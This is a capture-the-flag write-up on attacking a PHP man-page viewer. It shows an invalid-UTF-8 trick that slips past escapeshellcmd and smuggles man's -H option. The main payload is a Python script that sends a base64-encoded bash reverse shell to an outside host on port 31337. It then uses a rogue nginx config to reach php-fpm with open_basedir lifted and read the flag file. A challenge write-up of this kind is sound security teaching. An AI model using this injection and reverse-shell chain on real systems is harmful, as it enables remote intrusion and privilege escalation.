This challenge is a PHP application that renders the man page for a given command as HTML. The command is taken from the query string and passed as an argument to `/usr/bin/man` via `shell_exec()`:
```php
$arg = $_GET['page'];
[...]
$manpage = shell_exec('/usr/bin/man --troff-device=html --encoding=UTF-8 ' . $arg);
```

This would be a straight-up RCE, if it wasn't for an ad-hoc query sanitizer slapped on top of this:

1. Quotes of all kinds are stripped right away: `$arg = mb_ereg_replace('["\']', '', $arg);`.
2. If there are non-word characters at the beggining of a token (`if (mb_ereg('(^|\\s+)\W+', $arg) [...] ) {`), they are also stripped: `$arg = mb_ereg_replace('(^|\\s+)\W+', '\\1', $arg);`. This prevents us from passing additional funny `-Options` or `--options` to `/usr/bin/man`.
3. Finally, `$arg = escapeshellcmd($arg)` escapes pretty much everything we could use in a shell command for malicious purposes.

At first glance, this seems surprisingly solid. But, unfortunately for the author of the sanitizer and fortunately for us, the challenge tries to use UTF-8:
```php
mb_regex_encoding('utf-8') or die('Invalid encoding');
mb_internal_encoding('utf-8') or die('Invalid encoding');
setlocale(LC_CTYPE, 'en_US.utf8');
```

In fact, strings in PHP are just old-school byte sequences. All `mb_internal_encoding()/mb_regex_encoding()` do is simply set the `encoding` parameters for `mb_*` functions, which will then handle the bytes accordingly. If the bytes we provide to these functions are not actually valid UTF-8, well, tough luck:
```php
<?php
    mb_regex_encoding('utf-8');
    mb_internal_encoding('utf-8');
    setlocale(LC_CTYPE, 'en_US.utf8');

    $valid_utf8 = "-Evil";
    // 0xCA is 0b11001010
    //   which means a continuation byte in the form of 10xxxxxx
    //   must immediately follow it => this is incorrect UTF-8
    $invalid_utf8 = "\xca" . $valid_utf8;

    // The original valid UTF-8 triggers the sanitizer,
    // so this prints "Uh-oh, busted.".
    if (mb_ereg("(^|\\s+)\W+", $valid_utf8)) {
        echo "Uh-oh, busted.", PHP_EOL;
    } else {
        echo "Go ahead.", PHP_EOL;
    }

    // However, regular expression functions silently fail
    // on invalid UTF-8, which means this prints "Go ahead."
    if (mb_ereg("(^|\\s+)\W+", $invalid_utf8)) {
        echo "Uh-oh, busted.", PHP_EOL;
    } else {
        echo "Go ahead.", PHP_EOL;
    }

    // After that, escapeshellcmd() simply drops the invalid character,
    // which is exactly what we want (i.e., this prints "bool(true)").
    var_dump($valid_utf8 === escapeshellcmd($invalid_utf8));
?>
```

Great, so this allows us to smuggle an additional option to `/usr/bin/man`. There are plenty to choose from; the most obvious one is `-H`, which allows us to specify a web browser to view the man page. `escapeshellcmd()` still escapes everything, but that actually works for us, not against:
  * the shell that PHP runs to execute `/usr/bin/man` sees escaped characters, so they are not interpreted in any way and are just passed to the `-H` option of `/usr/bin/man` directly;
  * however, *the shell that `/usr/bin/man` itself spawns to invoke the browser* sees unescaped characters.
  
This means we can use [the standard bash payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) to obtain a reverse shell. We only need to ensure we avoid spaces (they are not quoted by `escapeshellcmd()`, but can be replaced with `${IFS}`) and quotes (they are stripped unconditionally; we can base64-encode our payload to bypass this):
```python
REV_SHELL = 'bash -i >& /dev/tcp/`getent hosts cursed.page | cut -d" " -f1`/31337 0>&1'
SAFE_REV_SHELL = f'echo {base64.b64encode(REV_SHELL.encode()).decode()} | base64 -d | bash'.replace(' ', '${IFS}')
CGI_READY_REV_SHELL = b'\xca-H' + SAFE_REV_SHELL.encode() + b'; id'

[...]

requests.get(URL, params={
	'page': CGI_READY_REV_SHELL,
})
```

This is not the end of it, because we still can't read the flag even with a shell:
```
PS> python .\get_shell.py [REDACTED_IP]
[...]
$ nc -lv 31337
Listening on [0.0.0.0] (family 2, port 31337)
Connection from [REDACTED_IP] received!
bash: cannot set terminal process group (17): Inappropriate ioctl for device
bash: no job control in this shell
www-data@b5c29be1eabd:~/html$ ls -lh /
ls -lh /
ls: cannot open directory '/': Permission denied
```

The flag is stored in `/`, but its basename is 24 random characters, which is unguessable. And the AppArmor policy for `/usr/bin/man` allows us to list files in any directory *except* the root one:
```
www-data@b5c29be1eabd:~/html$ cat /etc/apparmor.d/usr.bin.man
[...]
/** mrixwlk,
[...]
```

php-fpm, though, is not confined to any AppArmor policy. Even better, our reverse shell is running as `www-data` and we can talk to PHP via a UNIX socket (`/run/php/php7.3-fpm.sock`).

The obvious idea is to trick PHP into revealing the contents of `/`. PHP (php-fpm) speaks [FastCGI](http://www.mit.edu/~yandros/doc/specs/fcgi-spec.html), which seems moderately annoying to implement.
In order to avoid that, we spin up another instance of `nginx` with a custom config pointed at `/tmp/evil`.

```
www-data@b5c29be1eabd:/tmp/evil$ cat nginx.conf
pid /tmp/evil/evil.pid;
events {}

error_log /tmp/evil/err.evil;

http {
    access_log /tmp/evil/acc.evil;
    server {
            listen 127.0.0.1:31337 default_server;
            root /tmp/evil;
            server_name _;
            location ~ \.php$ {
                    include /etc/nginx/fastcgi.conf;
                    fastcgi_param PHP_VALUE open_basedir=/;
                    fastcgi_pass unix:/run/php/php7.3-fpm.sock;
            }
    }
}
```

The `fastcgi_param PHP_VALUE open_basedir=/` bypass is crucial for this to work.
If we omit it, php-fpm refuses to run scripts from `/tmp/evil` because its `open_basedir=` is set to `/var/www/html` in `www.conf`.

When we run `nginx` with this config, it complains that the error log is missing (I didn't find a way to make this warning go away), but runs anyway:
```
www-data@b5c29be1eabd:/tmp/evil$ /usr/sbin/nginx -c /tmp/evil/nginx.conf
nginx: [alert] could not open error log file: open() "/var/log/nginx/error.log" failed (6: No such device or address)
www-data@b5c29be1eabd:/tmp/evil$ cat evil.pid
172
```

Now all we need is a script that is going to be run by `php-fpm`:
```
www-data@b5c29be1eabd:/tmp/evil$ cat evil.php
<?php foreach (glob("/flag*") as $fn) echo "$fn\n"; ?>
```

And another one to orchestrate everything and finally get the flag:
```
www-data@b5c29be1eabd:/tmp/evil$ cat fetch_evil.php
<?php echo(file_get_contents("http://127.0.0.1:31337/evil.php")); ?>
www-data@b5c29be1eabd:/tmp/evil$ php -f fetch_evil.php
/flag_XaPrL5YjYmIhrOqxqSbUaE3u.txt
www-data@b5c29be1eabd:/tmp/evil$ cat /flag_XaPrL5YjYmIhrOqxqSbUaE3u.txt
hxp{maybe_this_will_finally_get_me_that_sweet_VC_money$$$}
```
